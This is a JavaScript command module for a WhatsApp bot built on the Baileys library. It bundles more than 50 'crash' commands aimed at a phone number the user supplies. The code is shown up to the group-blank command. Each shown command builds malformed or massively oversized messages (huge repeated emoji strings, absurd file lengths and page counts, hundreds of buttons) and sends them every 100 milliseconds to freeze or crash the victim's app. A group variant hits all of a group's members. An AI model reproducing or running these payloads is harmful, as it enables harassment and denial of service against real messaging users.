// ================================================
// BUG/CRASH COMMANDS (50+)
// From Yakuza, GTRD, Death Infinity, CypherX bots
// With .stopbug to stop all active bug processes
// ================================================

const config = require('../config');
const fs = require('fs-extra');
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

// Store active bug processes
global.activeBugs = global.activeBugs || new Map();

module.exports = {
    category: 'BUG CMDS',
    
    menu: (bot, from, pushName, logo) => {
        const menuText = `━━━━━━━━━━━━━━━━━━
       ⚡ BUG/CRASH COMMANDS ⚡
━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━┓
┃      𝗕𝗨𝗚 𝗖𝗠𝗗𝗦 (50+)  ┃
┗━━━━━━━━━━━━━━━━━━┛
├ .invis-hard » Invisible crash
├ .delay-hard » Delay crash
├ .crash-invis » Crash invisible
├ .invis-protocol » Protocol crash
├ .fc-invis » FC invisible
├ .crash-ui » UI crash
├ .blank » Blank crash
├ .force-lose » Force lose
├ .ui-system » UI system crash
├ .nukeblast » Nuke attack
├ .darkvoid » Void crash
├ .venomstrike » Venom strike
├ .phantomkill » Phantom kill
├ .deathpulse » Death pulse
├ .toxicstorm » Toxic storm
├ .shadowforce » Shadow force
├ .inferno » Inferno
├ .blackout » Blackout
├ .crash-infinite » Infinite crash
├ .blank-group » Blank group
├ .pairing-spam » Pairing spam
├ .call-bomb » Call bomb
├ .crash-vcard » Crash vCard
├ .crash-location » Crash location
├ .crash-contact » Crash contact
├ .crash-poll » Crash poll
├ .crash-list » Crash list
├ .crash-button » Crash button
├ .crash-product » Crash product
├ .crash-catalog » Crash catalog
├ .crash-order » Crash order
├ .crash-invoice » Crash invoice
├ .crash-payment » Crash payment
├ .crash-sticker » Crash sticker
├ .crash-gif » Crash GIF
├ .crash-audio » Crash audio
├ .crash-video » Crash video
├ .crash-document » Crash document
├ .crash-image » Crash image
├ .crash-ptv » Crash PTV
├ .crash-newsletter » Crash newsletter
├ .crash-channel » Crash channel
├ .crash-status » Crash status
├ .crash-story » Crash story
├ .crash-reaction » Crash reaction
├ .crash-mention » Crash mention
├ .crash-forward » Crash forward
├ .crash-quote » Crash quote
├ .crash-reply » Crash reply
├ .crash-edit » Crash edit
├ .crash-delete » Crash delete
└ .stopbug » Stop all active bug processes

━━━━━━━━━━━━━━━━━━
⚠️ Use at your own risk! ⚠️
👤 User: ${pushName}
━━━━━━━━━━━━━━━━━━`;

        if (logo) {
            bot.sendMessage(from, { image: logo.image, caption: menuText });
        } else {
            bot.sendMessage(from, { text: menuText });
        }
    },
    
    list: `├ .invis-hard » Invisible crash
├ .delay-hard » Delay crash
├ .crash-invis » Crash invisible
├ .invis-protocol » Protocol crash
├ .fc-invis » FC invisible
├ .crash-ui » UI crash
├ .blank » Blank crash
├ .force-lose » Force lose
├ .ui-system » UI system crash
├ .nukeblast » Nuke attack
├ .darkvoid » Void crash
├ .venomstrike » Venom strike
├ .phantomkill » Phantom kill
├ .deathpulse » Death pulse
├ .toxicstorm » Toxic storm
├ .shadowforce » Shadow force
├ .inferno » Inferno
├ .blackout » Blackout
├ .crash-infinite » Infinite crash
├ .blank-group » Blank group
├ .pairing-spam » Pairing spam
├ .call-bomb » Call bomb
├ .crash-vcard » Crash vCard
├ .crash-location » Crash location
├ .crash-contact » Crash contact
├ .crash-poll » Crash poll
├ .crash-list » Crash list
├ .crash-button » Crash button
├ .crash-product » Crash product
├ .crash-catalog » Crash catalog
├ .crash-order » Crash order
├ .crash-invoice » Crash invoice
├ .crash-payment » Crash payment
├ .crash-sticker » Crash sticker
├ .crash-gif » Crash GIF
├ .crash-audio » Crash audio
├ .crash-video » Crash video
├ .crash-document » Crash document
├ .crash-image » Crash image
├ .crash-ptv » Crash PTV
├ .crash-newsletter » Crash newsletter
├ .crash-channel » Crash channel
├ .crash-status » Crash status
├ .crash-story » Crash story
├ .crash-reaction » Crash reaction
├ .crash-mention » Crash mention
├ .crash-forward » Crash forward
├ .crash-quote » Crash quote
├ .crash-reply » Crash reply
├ .crash-edit » Crash edit
├ .crash-delete » Crash delete
└ .stopbug » Stop all active bugs`,
    
    // ================================================
    // STOP BUG COMMAND - Stops all active bug processes
    // ================================================
    
    stopbug: async (ctx) => {
        if (!ctx.Owner && !ctx.Premium) {
            return ctx.bot.sendMessage(ctx.from, { text: global.styleError("Premium only!") });
        }
        
        const targetKey = ctx.from;
        const bugId = `${targetKey}_${Date.now()}`;
        
        if (global.activeBugs && global.activeBugs.size > 0) {
            // Clear all intervals and timeouts
            for (const [key, timers] of global.activeBugs.entries()) {
                if (timers.interval) clearInterval(timers.interval);
                if (timers.timeouts) {
                    timers.timeouts.forEach(timeout => clearTimeout(timeout));
                }
            }
            
            // Clear the map
            global.activeBugs.clear();
            
            await ctx.bot.sendMessage(ctx.from, { 
                text: global.styleSuccess("✅ All active bug processes have been stopped successfully!") 
            });
            
            console.log(`🛑 All bugs stopped by ${ctx.sender.split('@')[0]}`);
        } else {
            await ctx.bot.sendMessage(ctx.from, { 
                text: global.styleInfo("ℹ️ No active bug processes found.") 
            });
        }
    },
    
    // ================================================
    // BUG COMMAND HELPER FUNCTION
    // ================================================
    
    _startBugProcess: async (ctx, target, bugType, sendFunction) => {
        if (!ctx.Owner && !ctx.Premium) {
            return ctx.bot.sendMessage(ctx.from, { text: global.styleError("Premium only!") });
        }
        
        if (!target) {
            return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo(`Usage: .${bugType} <number>`) });
        }
        
        const targetJid = target.replace(/\D/g, '') + '@s.whatsapp.net';
        const bugId = `${targetJid}_${bugType}_${Date.now()}`;
        
        await ctx.bot.sendMessage(ctx.from, { 
            text: global.styleProcess(`🚀 Starting ${bugType} attack on ${target}...`) 
        });
        
        // Create bug process entry
        const timeouts = [];
        const interval = setInterval(async () => {
            try {
                await sendFunction(targetJid);
            } catch (e) {
                console.log(`Error in ${bugType}:`, e.message);
            }
        }, 100);
        
        // Store in active bugs
        global.activeBugs.set(bugId, {
            type: bugType,
            target: targetJid,
            interval,
            timeouts,
            startTime: Date.now()
        });
        
        // Auto-stop after 30 seconds to prevent infinite loops
        const timeout = setTimeout(() => {
            clearInterval(interval);
            global.activeBugs.delete(bugId);
            ctx.bot.sendMessage(ctx.from, { 
                text: global.styleWarning(`⚠️ ${bugType} attack on ${target} auto-stopped after 30 seconds`) 
            }).catch(() => {});
        }, 30000);
        
        timeouts.push(timeout);
        
        return bugId;
    },
    
    // ================================================
    // INVIS-HARD
    // ================================================
    
    'invis-hard': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .invis-hard <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'invis-hard', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=',
                                    fileLength: '9999999999999',
                                    pageCount: 2147483647,
                                    mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
                                    fileName: '𝐂𝐑𝐀𝐒𝐇.𝐩𝐩𝐭𝐱',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    contactVcard: true,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '𐌕𐌀𐌌𐌀 RTL‮BUG‬𐍂𐍉𐍂' + '𒐫'.repeat(5000) },
                            nativeFlowMessage: {}
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // DELAY-HARD
    // ================================================
    
    'delay-hard': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .delay-hard <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'delay-hard', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                                    fileLength: '9999999999999',
                                    pageCount: 2147483647,
                                    mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
                                    fileName: 'DELAY.pptx',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    contactVcard: true,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '⏳'.repeat(50000) },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: 'call_permission_request', buttonParamsJson: '{}' },
                                    { name: 'mpm', buttonParamsJson: '{}' },
                                    { name: 'galaxy_message', buttonParamsJson: '{}' }
                                ]
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // CRASH-INVIS
    // ================================================
    
    'crash-invis': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-invis <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'crash-invis', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: '𒐫'.repeat(100000), format: 'PLAIN' },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: JSON.stringify({ screen: 'FORM_SCREEN', data: 'x'.repeat(50000) }),
                                version: 3
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // INVIS-PROTOCOL
    // ================================================
    
    'invis-protocol': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .invis-protocol <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'invis-protocol', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        protocolMessage: {
                            key: { remoteJid: targetJid, fromMe: false, id: 'INVALID_ID' + 'x'.repeat(100) },
                            type: 25,
                            ephemeralExpiration: 999999
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // FC-INVIS
    // ================================================
    
    'fc-invis': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .fc-invis <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'fc-invis', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            body: { text: '𐌕𐌀𐌌𐌀'.repeat(20000) },
                            nativeFlowMessage: {
                                buttons: Array(100).fill({
                                    name: 'call_permission_request',
                                    buttonParamsJson: JSON.stringify({ data: 'x'.repeat(1000) })
                                })
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // CRASH-UI
    // ================================================
    
    'crash-ui': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-ui <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'crash-ui', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc',
                                    mimetype: 'video/mp4',
                                    fileSha256: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                                    fileLength: '9999999999999',
                                    pageCount: 2147483647,
                                    mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                                    fileName: 'UI_CRASH.mp4',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '🖥️'.repeat(30000) },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: 'mpm', buttonParamsJson: '{}' },
                                    { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ screen: 'UI_CRASH' }) }
                                ]
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // BLANK
    // ================================================
    
    blank: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .blank <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'blank', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=',
                                    fileLength: '9999999999999',
                                    pageCount: 2147483647,
                                    mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
                                    fileName: 'BLANK.pptx',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    contactVcard: true,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: ' '.repeat(100000) },
                            nativeFlowMessage: {}
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // FORCE-LOSE
    // ================================================
    
    'force-lose': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .force-lose <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'force-lose', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: 'QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=',
                                    fileLength: '9999999999999',
                                    pageCount: 2147483647,
                                    mediaKey: '45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=',
                                    fileName: 'FORCE_LOSE.pptx',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '🔥'.repeat(30000) },
                            footer: { text: '𒐫'.repeat(20000) },
                            nativeFlowMessage: {
                                buttons: Array(50).fill({ name: 'call_permission_request', buttonParamsJson: '{}' })
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // UI-SYSTEM
    // ================================================
    
    'ui-system': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .ui-system <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'ui-system', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                imageMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mimetype: 'image/jpeg',
                                    fileSha256: 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=',
                                    fileLength: '9999999999999',
                                    height: 9999,
                                    width: 9999,
                                    mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    jpegThumbnail: '',
                                    scansSidecar: 'igcFUbzFLVfZVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                                    scanLengths: [5000, 5000, 5000]
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '⚙️'.repeat(50000) },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ screen: 'UI_SYSTEM' }) },
                                    { name: 'mpm', buttonParamsJson: '{}' }
                                ]
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // NUKEBLAST
    // ================================================
    
    nukeblast: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .nukeblast <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'nukeblast', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: '💥'.repeat(50000) },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: 'call_permission_request', buttonParamsJson: JSON.stringify({ id: Date.now() }) }
                                ]
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // DARKVOID
    // ================================================
    
    darkvoid: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .darkvoid <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'darkvoid', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        listMessage: {
                            title: '⬛'.repeat(1000),
                            description: '⬛'.repeat(1000),
                            buttonText: 'VOID',
                            listType: 2,
                            sections: Array(50).fill({
                                title: 'VOID',
                                rows: Array(100).fill({ title: '⬛', id: '⬛' })
                            })
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // VENOMSTRIKE
    // ================================================
    
    venomstrike: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .venomstrike <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'venomstrike', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        buttonsMessage: {
                            contentText: '🐍'.repeat(5000),
                            footerText: '🐍'.repeat(5000),
                            headerType: 1,
                            buttons: Array(30).fill({ buttonId: 'id', buttonText: { displayText: 'VENOM' }, type: 1 })
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // PHANTOMKILL
    // ================================================
    
    phantomkill: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .phantomkill <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'phantomkill', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                productMessage: {
                                    product: {
                                        productImage: { url: 'https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc' },
                                        title: '👻'.repeat(5000),
                                        description: '👻'.repeat(5000),
                                        currencyCode: 'USD',
                                        priceAmount1000: 999999999,
                                        retailerId: '👻'.repeat(1000)
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '👻'.repeat(50000) },
                            nativeFlowMessage: {}
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // DEATHPULSE
    // ================================================
    
    deathpulse: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .deathpulse <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'deathpulse', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        reactionMessage: {
                            key: { remoteJid: targetJid, fromMe: false, id: '💀'.repeat(100) },
                            text: '💀'.repeat(5000)
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // TOXICSTORM
    // ================================================
    
    toxicstorm: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .toxicstorm <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'toxicstorm', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: '☣️'.repeat(20000) },
                            nativeFlowMessage: {
                                buttons: Array(20).fill({
                                    name: 'call_permission_request',
                                    buttonParamsJson: JSON.stringify({ toxic: 'x'.repeat(1000) })
                                })
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // SHADOWFORCE
    // ================================================
    
    shadowforce: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .shadowforce <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'shadowforce', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        listMessage: {
                            title: '🌑'.repeat(1000),
                            description: '🌑'.repeat(1000),
                            buttonText: 'SHADOW',
                            listType: 1,
                            sections: Array(30).fill({
                                title: 'SHADOW',
                                rows: Array(200).fill({ title: '🌑', id: '🌑'.repeat(100) })
                            })
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // INFERNO
    // ================================================
    
    inferno: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .inferno <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'inferno', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc',
                                    mimetype: 'video/mp4',
                                    fileSha256: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                                    fileLength: '9999999999999',
                                    pageCount: 999999,
                                    mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                                    fileName: 'INFERNO.mp4',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    jpegThumbnail: ''
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '🔥'.repeat(50000) },
                            nativeFlowMessage: {
                                buttons: Array(10).fill({ name: 'galaxy_message', buttonParamsJson: '{}' })
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // BLACKOUT
    // ================================================
    
    blackout: async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .blackout <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'blackout', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                imageMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mimetype: 'image/jpeg',
                                    fileSha256: 'Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=',
                                    fileLength: '9999999999999',
                                    height: 9999,
                                    width: 9999,
                                    mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
                                    fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                                    directPath: '/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc',
                                    mediaKeyTimestamp: 1743848703,
                                    jpegThumbnail: '',
                                    scansSidecar: '⬛'.repeat(10000)
                                },
                                hasMediaAttachment: true
                            },
                            body: { text: '⬛'.repeat(100000) },
                            nativeFlowMessage: {}
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // CRASH-INFINITE
    // ================================================
    
    'crash-infinite': async (ctx) => {
        if (!ctx.args[0]) return ctx.bot.sendMessage(ctx.from, { text: global.styleInfo("Usage: .crash-infinite <number>") });
        
        const target = ctx.args[0].replace(/\D/g, '');
        
        await module.exports._startBugProcess(ctx, target, 'crash-infinite', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                            fileLength: '9999999999999',
                            pageCount: 999999,
                            mediaKey: 'JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=',
                            fileName: 'INFINITE.pptx',
                            fileEncSha256: 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                            directPath: '/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc',
                            mediaKeyTimestamp: 1743848703,
                            jpegThumbnail: ''
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // BLANK-GROUP
    // ================================================
    
    'blank-group': async (ctx) => {
        if (!ctx.isGroup) {
            return ctx.bot.sendMessage(ctx.from, { text: global.styleError("This command must be used in a group!") });
        }
        
        await module.exports._startBugProcess(ctx, ctx.from, 'blank-group', async (targetJid) => {
            const msg = generateWAMessageFromContent(targetJid, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: ' '.repeat(100000) },
                            nativeFlowMessage: {
                                buttons: Array(100).fill({ name: 'mpm', buttonParamsJson: '{}' })
                            },
                            contextInfo: {
                                mentionedJid: ctx.participants.map(p => p.id),
                                groupMentions: [{ groupJid: targetJid, groupSubject: ' '.repeat(5000) }]
                            }
                        }
                    }
                }
            }, {});
            
            await ctx.bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
        });
    },
    
    // ================================================
    // PAIRING-SPAM
    // ================================================
    
